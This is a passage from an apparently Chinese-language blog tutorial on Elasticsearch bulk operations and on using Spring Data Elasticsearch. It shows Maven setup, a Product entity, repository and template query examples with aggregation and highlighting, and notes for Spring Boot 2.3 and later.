<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">POST /索引名/类型/_bulk</span><br><span class="line">&#123;动作:&#123;&quot;_id&quot;: 文档ID&#125;&#125;</span><br><span class="line">&#123;...&#125;</span><br><span class="line">&#123;动作:&#123;&quot;_id&quot;: 文档ID&#125;&#125;</span><br><span class="line">&#123;...&#125;</span><br><span class="line"></span><br><span class="line">动作：create / update / delete，其中delete只有1行JSON，其他操作都是有2行JSON，并且JSON不能格式化，如果是update动作，它的数据需要加个key为doc</span><br><span class="line">如：</span><br><span class="line">&#123;&quot;update&quot;: &#123;&quot;_id&quot;: xx&#125;&#125;</span><br><span class="line">&#123;&quot;doc&quot;: &#123;&quot;xx&quot;:xx, &quot;xx&quot;:xx&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="spring-data-elasticsearch"><a class="markdownIt-Anchor" href="#spring-data-elasticsearch">#</a> Spring Data Elasticsearch</h2>
<h3 id="准备环境"><a class="markdownIt-Anchor" href="#准备环境">#</a> 准备环境</h3>
<h4 id="导入依赖"><a class="markdownIt-Anchor" href="#导入依赖">#</a> 导入依赖</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;parent&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.1.3.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/parent&gt;</span><br><span class="line"></span><br><span class="line">&lt;properties&gt;</span><br><span class="line">    &lt;java.version&gt;1.8&lt;/java.version&gt;</span><br><span class="line">&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;!--SpringBoot整合Spring Data Elasticsearch的依赖--&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-data-elasticsearch&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">        &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.8.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">    &lt;/plugins&gt;</span><br><span class="line">&lt;/build&gt;</span><br></pre></td></tr></table></figure>
<h4 id="编写domain"><a class="markdownIt-Anchor" href="#编写domain">#</a> 编写 DOMAIN</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">  @Document：配置操作哪个索引下的哪个类型</span><br><span class="line">  @Id：标记文档ID字段</span><br><span class="line">  @Field：配置映射信息，如：分词器</span><br><span class="line"> */</span><br><span class="line">@Getter@Setter@ToString</span><br><span class="line">@NoArgsConstructor</span><br><span class="line">@AllArgsConstructor</span><br><span class="line">@Document(indexName=&quot;shop_product&quot;, type=&quot;shop_product&quot;)</span><br><span class="line">public class Product &#123;</span><br><span class="line">    @Id</span><br><span class="line">    private String id;</span><br><span class="line"></span><br><span class="line">    @Field(analyzer=&quot;ik_max_word&quot;,searchAnalyzer=&quot;ik_max_word&quot;, type=FieldType.Text)</span><br><span class="line">    private String title;</span><br><span class="line"></span><br><span class="line">    private Integer price;</span><br><span class="line"></span><br><span class="line">    @Field(analyzer=&quot;ik_max_word&quot;,searchAnalyzer=&quot;ik_max_word&quot;, type=FieldType.Text)</span><br><span class="line">    private String intro;</span><br><span class="line"></span><br><span class="line">    @Field(type=FieldType.Keyword)</span><br><span class="line">    private String brand;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="配置连接信息"><a class="markdownIt-Anchor" href="#配置连接信息">#</a> 配置连接信息</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#application.properties</span><br><span class="line"># 配置集群名称，名称写错会连不上服务器，默认elasticsearch</span><br><span class="line">spring.data.elasticsearch.cluster-name=elasticsearch</span><br><span class="line"># 配置集群节点</span><br><span class="line">spring.data.elasticsearch.cluster-nodes=localhost:9300</span><br></pre></td></tr></table></figure>
<h3 id="elasticsearchrepository"><a class="markdownIt-Anchor" href="#elasticsearchrepository">#</a> ElasticsearchRepository</h3>
<p>该接口是框架封装的用于操作 Elastsearch 的高级接口，只要我们自己的写个接口去继承该接口就能直接对 Elasticsearch 进行 CRUD 操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">  泛型1：domain的类型</span><br><span class="line">  泛型2：文档主键类型</span><br><span class="line">  该接口直接该给Spring，底层会使用JDK代理的方式创建对象，交给容器管理</span><br><span class="line"> */</span><br><span class="line">@Repository</span><br><span class="line">public interface ProductESRepository extends ElasticsearchRepository&lt;Product, String&gt; &#123;</span><br><span class="line">    // 符合Spring Data规范的高级查询方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="完成crud分页排序"><a class="markdownIt-Anchor" href="#完成crud分页排序">#</a> 完成 CRUD + 分页 + 排序</h3>
<h3 id="组件介绍"><a class="markdownIt-Anchor" href="#组件介绍">#</a> 组件介绍</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ElasticsearchRepository：框架封装的用于便捷完成常用操作的工具接口</span><br><span class="line">ElasticsearchTemplate：框架封装的用于便捷操作Elasticsearch的模板类</span><br><span class="line"></span><br><span class="line">NativeSearchQueryBuilder：用于生成查询条件的构建器，需要去封装各种查询条件</span><br><span class="line">QueryBuilder：该接口表示一个查询条件，其对象可以通过QueryBuilders工具类中的方法快速生成各种条件</span><br><span class="line">  boolQuery()：生成bool条件，相当于 &quot;bool&quot;: &#123; &#125;</span><br><span class="line">  matchQuery()：生成match条件，相当于 &quot;match&quot;: &#123; &#125;</span><br><span class="line">  rangeQuery()：生成range条件，相当于 &quot;range&quot;: &#123; &#125;</span><br><span class="line">AbstractAggregationBuilder：用于生成分组查询的构建器，其对象通过AggregationBuilders工具类生成</span><br><span class="line">Pageable：表示分页参数，对象通过PageRequest.of(页数, 容量)获取</span><br><span class="line">SortBuilder：排序构建器，对象通过SortBuilders.fieldSort(字段).order(规则)获取</span><br></pre></td></tr></table></figure>
<h3 id="elasticsearchtemplate"><a class="markdownIt-Anchor" href="#elasticsearchtemplate">#</a> ElasticsearchTemplate</h3>
<p>该模板类，封装了便捷操作 Elasticsearch 的模板方法，包括 索引 / 映射 / CRUD 等底层操作和高级操作，该对象用起来会略微复杂些，尤其是对于查询，还需要把查询到的结果自己封装对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//该对象已经由SpringBoot完成自动配置，直接注入即可</span><br><span class="line">@Autowired</span><br><span class="line">private ElasticsearchTemplate template;</span><br></pre></td></tr></table></figure>
<p>一般情况下，ElasticsearchTemplate 和 ElasticsearchRepository 是分工合作的，ElasticsearchRepository 已经能完成绝大部分的功能，如果遇到复杂的查询则要使用 ElasticsearchTemplate，如多字段分组、高亮显示等</p>
<h3 id="实例代码"><a class="markdownIt-Anchor" href="#实例代码">#</a> 实例代码</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line">@Autowired</span><br><span class="line">private ElasticsearchTemplate template;</span><br><span class="line"></span><br><span class="line">@Autowired</span><br><span class="line">private ProductESRepository repository;</span><br><span class="line"></span><br><span class="line">// 新增或者覆盖一个文档</span><br><span class="line">@Test</span><br><span class="line">public void testSaveOrUpdate() throws Exception &#123;</span><br><span class="line">    // 索引库中不存在则新增，存在则覆盖</span><br><span class="line">    Product p = new Product(&quot;13&quot;, &quot;华为手环 B5（Android 运动手环）&quot;, 999,</span><br><span class="line">                            &quot;高清彩屏 腕上蓝牙耳机 心率检测 来电消息提醒&quot;, &quot;华为&quot;);</span><br><span class="line">    repostitory.save(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 删除一个文档</span><br><span class="line">@Test</span><br><span class="line">public void testDelete() throws Exception &#123;</span><br><span class="line">    repostitory.deleteById(&quot;13&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 根据ID查询一个文档</span><br><span class="line">@Test</span><br><span class="line">public void testGet() throws Exception &#123;</span><br><span class="line">    Optional&lt;Product&gt; optional = repostitory.findById(&quot;1&quot;);</span><br><span class="line">    optional.ifPresent(System.out::println);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 查询所有文档</span><br><span class="line">@Test</span><br><span class="line">public void testList() throws Exception &#123;</span><br><span class="line">    Iterable&lt;Product&gt; iter = repostitory.findAll();</span><br><span class="line">    iter.forEach(System.out::println);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 分页查询文档按照价格降序排列，显示第2页，每页显示3个</span><br><span class="line">@Test</span><br><span class="line">public void testQuery1() throws Exception &#123;</span><br><span class="line">    NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder();</span><br><span class="line">    // 设置分页信息</span><br><span class="line">    builder.withPageable(PageRequest.of(1, 3));</span><br><span class="line">    // 设置排序信息</span><br><span class="line">    builder.withSort(SortBuilders.fieldSort(&quot;price&quot;).order(SortOrder.DESC));</span><br><span class="line"></span><br><span class="line">    Page&lt;Product&gt; page = repostitory.search(builder.build());</span><br><span class="line">    System.out.println(page.getTotalElements()); //总记录数</span><br><span class="line">    System.out.println(page.getTotalPages()); //总页数</span><br><span class="line">    page.forEach(System.out::println);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 查询商品标题中符合&quot;游戏 手机&quot;的字样的商品</span><br><span class="line">@Test</span><br><span class="line">public void testQuery2() throws Exception &#123;</span><br><span class="line">    NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder();</span><br><span class="line">    builder.withQuery(</span><br><span class="line">        QueryBuilders.matchQuery(&quot;title&quot;, &quot;游戏 手机&quot;)</span><br><span class="line">    );</span><br><span class="line">    Page&lt;Product&gt; page = repostitory.search(builder.build());</span><br><span class="line">    page.forEach(System.out::println);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 查询商品价格等于15299的商品</span><br><span class="line">@Test</span><br><span class="line">public void testQuery3() throws Exception &#123;</span><br><span class="line">    NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder();</span><br><span class="line">    builder.withQuery(</span><br><span class="line">        QueryBuilders.termQuery(&quot;price&quot;, 15299)</span><br><span class="line">    );</span><br><span class="line">    Page&lt;Product&gt; page = repostitory.search(builder.build());</span><br><span class="line">    page.forEach(System.out::println);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 查询商品价格在5000~9000之间商品，按照价格升序排列</span><br><span class="line">@Test</span><br><span class="line">public void testQuery4() throws Exception &#123;</span><br><span class="line">    NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder();</span><br><span class="line">    builder.withQuery(</span><br><span class="line">        QueryBuilders.rangeQuery(&quot;price&quot;)</span><br><span class="line">            .gte(5000).lte(9000)</span><br><span class="line">    );</span><br><span class="line">    builder.withSort(SortBuilders.fieldSort(&quot;price&quot;).order(SortOrder.ASC));</span><br><span class="line">    Page&lt;Product&gt; page = repostitory.search(builder.build());</span><br><span class="line">    page.forEach(System.out::println);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 查询商品标题或简介中符合&quot;蓝牙 指纹 双卡&quot;的字样的商品</span><br><span class="line">@Test</span><br><span class="line">public void testQuery5() throws Exception &#123;</span><br><span class="line">    NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder();</span><br><span class="line">    builder.withQuery(</span><br><span class="line">        QueryBuilders.multiMatchQuery(&quot;蓝牙 指纹 双卡&quot;,</span><br><span class="line">                                      &quot;title&quot;, &quot;intro&quot;)</span><br><span class="line">    );</span><br><span class="line">    Page&lt;Product&gt; page = repostitory.search(builder.build());</span><br><span class="line">    page.forEach(System.out::println);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 查询商品标题中符合&quot;i7&quot;的字样并且价格大于7000的商品</span><br><span class="line">@Test</span><br><span class="line">public void testQuery6() throws Exception &#123;</span><br><span class="line">    NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder();</span><br><span class="line">    builder.withQuery(</span><br><span class="line">        QueryBuilders.boolQuery()</span><br><span class="line">        .must(QueryBuilders.matchQuery(&quot;title&quot;, &quot;i7&quot;))</span><br><span class="line">        .must(QueryBuilders.rangeQuery(&quot;price&quot;).gt(7000))</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    Page&lt;Product&gt; page = repostitory.search(builder.build());</span><br><span class="line">    page.forEach(System.out::println);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 查询商品标题中符合&quot;pro&quot;的字样或者价格在1000~3000的商品</span><br><span class="line">@Test</span><br><span class="line">public void testQuery7() throws Exception &#123;</span><br><span class="line">    NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder();</span><br><span class="line">    builder.withQuery(</span><br><span class="line">        QueryBuilders.boolQuery()</span><br><span class="line">            .should(QueryBuilders.matchQuery(&quot;title&quot;, &quot;pro&quot;))</span><br><span class="line">            .should(QueryBuilders.rangeQuery(&quot;price&quot;).gte(1000).lte(3000))</span><br><span class="line">    );</span><br><span class="line">    Page&lt;Product&gt; page = repostitory.search(builder.build());</span><br><span class="line">    page.forEach(System.out::println);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 按照品牌分组，统计各品牌的数量</span><br><span class="line">@Test</span><br><span class="line">public void testQuery8() throws Exception &#123;</span><br><span class="line">    NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder();</span><br><span class="line">    builder.addAggregation(</span><br><span class="line">        AggregationBuilders.terms(&quot;groupByBrand&quot;).field(&quot;brand&quot;)</span><br><span class="line">    );</span><br><span class="line">    AggregatedPage&lt;Product&gt; page = (AggregatedPage&lt;Product&gt;) repostitory.search(builder.build());</span><br><span class="line">    // 获取自定义的分组字段</span><br><span class="line">    StringTerms brand = (StringTerms) page.getAggregation(&quot;groupByBrand&quot;);</span><br><span class="line">    brand.getBuckets().forEach(bucket -&gt; System.out.println(bucket.getDocCount()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 按照品牌分组，统计各品牌的平均价格</span><br><span class="line">@Test</span><br><span class="line">public void testQuery9() throws Exception &#123;</span><br><span class="line">    NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder();</span><br><span class="line">    builder.addAggregation(</span><br><span class="line">        AggregationBuilders.terms(&quot;groupByBrand&quot;).field(&quot;brand&quot;)</span><br><span class="line">        .subAggregation(AggregationBuilders.avg(&quot;avgPrice&quot;).field(&quot;price&quot;))</span><br><span class="line">    );</span><br><span class="line">    AggregatedPage&lt;Product&gt; page = (AggregatedPage&lt;Product&gt;) repostitory.search(builder.build());</span><br><span class="line">    // 获取自定义的分组字段</span><br><span class="line">    StringTerms brand = (StringTerms) page.getAggregation(&quot;groupByBrand&quot;);</span><br><span class="line">    brand.getBuckets().forEach(bucket -&gt; &#123;</span><br><span class="line">        InternalAvg avgPrice = bucket.getAggregations().get(&quot;avgPrice&quot;);</span><br><span class="line">        System.out.println(avgPrice.getValue());</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 按照品牌分组，统计各品牌的价格数据</span><br><span class="line">@Test</span><br><span class="line">public void testQuery10() throws Exception &#123;</span><br><span class="line">    NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder();</span><br><span class="line">    builder.addAggregation(</span><br><span class="line">        AggregationBuilders.terms(&quot;groupByBrand&quot;).field(&quot;brand&quot;)</span><br><span class="line">        .subAggregation(AggregationBuilders.stats(&quot;statsPrice&quot;).field(&quot;price&quot;))</span><br><span class="line">    );</span><br><span class="line">    AggregatedPage&lt;Product&gt; page = (AggregatedPage&lt;Product&gt;) repostitory.search(builder.build());</span><br><span class="line">    // 获取自定义的分组字段</span><br><span class="line">    StringTerms brand = (StringTerms) page.getAggregation(&quot;groupByBrand&quot;);</span><br><span class="line">    brand.getBuckets().forEach(bucket -&gt; &#123;</span><br><span class="line">        InternalStats statsPrice = bucket.getAggregations().get(&quot;statsPrice&quot;);</span><br><span class="line">        System.out.println(statsPrice.getSumAsString());</span><br><span class="line">        System.out.println(statsPrice.getAvgAsString());</span><br><span class="line">        System.out.println(statsPrice.getMaxAsString());</span><br><span class="line">        System.out.println(statsPrice.getMinAsString());</span><br><span class="line">        System.out.println(statsPrice.getCount());</span><br><span class="line">        System.out.println(&quot;-----------------------&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 查询商品标题或简介中符合&quot;蓝牙 指纹 双卡&quot;的字样的商品，并且高亮显示</span><br><span class="line">@Test</span><br><span class="line">public void testHighlight() throws Exception &#123;</span><br><span class="line">    // Java与JSON互转的工具对象</span><br><span class="line">    ObjectMapper mapper = new ObjectMapper();</span><br><span class="line"></span><br><span class="line">    NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder();</span><br><span class="line">    // 设置查询哪个索引中的哪个类型</span><br><span class="line">    builder.withIndices(&quot;shop_product&quot;).withTypes(&quot;shop_product&quot;);</span><br><span class="line">    builder.withQuery(</span><br><span class="line">        QueryBuilders.multiMatchQuery(&quot;蓝牙 指纹 双卡&quot;,</span><br><span class="line">                                      &quot;title&quot;, &quot;intro&quot;)</span><br><span class="line">    );</span><br><span class="line">    builder.withHighlightFields(</span><br><span class="line">        new HighlightBuilder.Field(&quot;title&quot;)</span><br><span class="line">            .preTags(&quot;&lt;span style=&#x27;color:red&#x27;&gt;&quot;).postTags(&quot;&lt;/span&gt;&quot;),</span><br><span class="line">        new HighlightBuilder.Field(&quot;intro&quot;)</span><br><span class="line">            .preTags(&quot;&lt;span style=&#x27;color:red&#x27;&gt;&quot;).postTags(&quot;&lt;/span&gt;&quot;)</span><br><span class="line">    );</span><br><span class="line">    AggregatedPage&lt;Product&gt; page = template.queryForPage(builder.build(), Product.class, new SearchResultMapper() &#123;</span><br><span class="line">        public &lt;T&gt; AggregatedPage&lt;T&gt; mapResults(SearchResponse resp, Class&lt;T&gt; clazz, Pageable pageable) &#123;</span><br><span class="line">            List&lt;T&gt; list = new ArrayList&lt;&gt;();</span><br><span class="line">            try &#123;</span><br><span class="line">                for (SearchHit hit : resp.getHits().getHits()) &#123;</span><br><span class="line">                    // 把查询到的JSON字符串转换成Java对象</span><br><span class="line">                    T t = mapper.readValue(hit.getSourceAsString(), clazz);</span><br><span class="line">                    for (HighlightField field : hit.getHighlightFields().values()) &#123;</span><br><span class="line">                        // 替换需要高亮显示的字段，用到Apache的BeanUtils工具</span><br><span class="line">                        BeanUtils.setProperty(t, field.getName(), field.getFragments()[0].string());</span><br><span class="line">                    &#125;</span><br><span class="line">                    list.add(t);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">            long total = resp.getHits().totalHits;</span><br><span class="line">            return new AggregatedPageImpl&lt;&gt;(list, pageable, total);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    page.forEach(System.out::println);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="springboot23x以上配置"><a class="markdownIt-Anchor" href="#springboot23x以上配置">#</a> springboot2.3.x 以上配置</h3>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.spring.io/spring-data/elasticsearch/docs/4.0.1.RELEASE/reference/html/#new-features">配置关系对应</a></p>
<p><img src="https://images-jsh.oss-cn-beijing.aliyuncs.com/img/%E6%88%AA%E5%B1%8F2021-08-14%2014.17.14.png" alt="截屏2021-08-14 14.17.14"></p>
</blockquote>
<ol>
<li>
<p>pom 相同</p>
</li>
<li>
<p>配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">## 旧版本以spring.data.elasticsearch.开头;访问地址配置不用声明访问协议,监听es的tcp端口</span><br><span class="line">#spring.data.elasticsearch.cluster-nodes=localhost:9300</span><br><span class="line">#spring.data.elasticsearch.cluster-name=elasticsearch</span><br><span class="line"></span><br><span class="line">## 新版本以spring.elasticsearch.rest.开头;访问地址配置需要声明访问协议,直接监听es访问端口</span><br><span class="line">spring.elasticsearch.rest.uris=http://localhost:9200</span><br><span class="line">spring.elasticsearch.rest.username=elasticsearch</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>使用</p>
<ul>
<li>
<p>旧版的核心访问对象是 ElasticsearchTemplate；新版的核心访问对象是 ElasticsearchRestTemplate；</p>
</li>
<li>
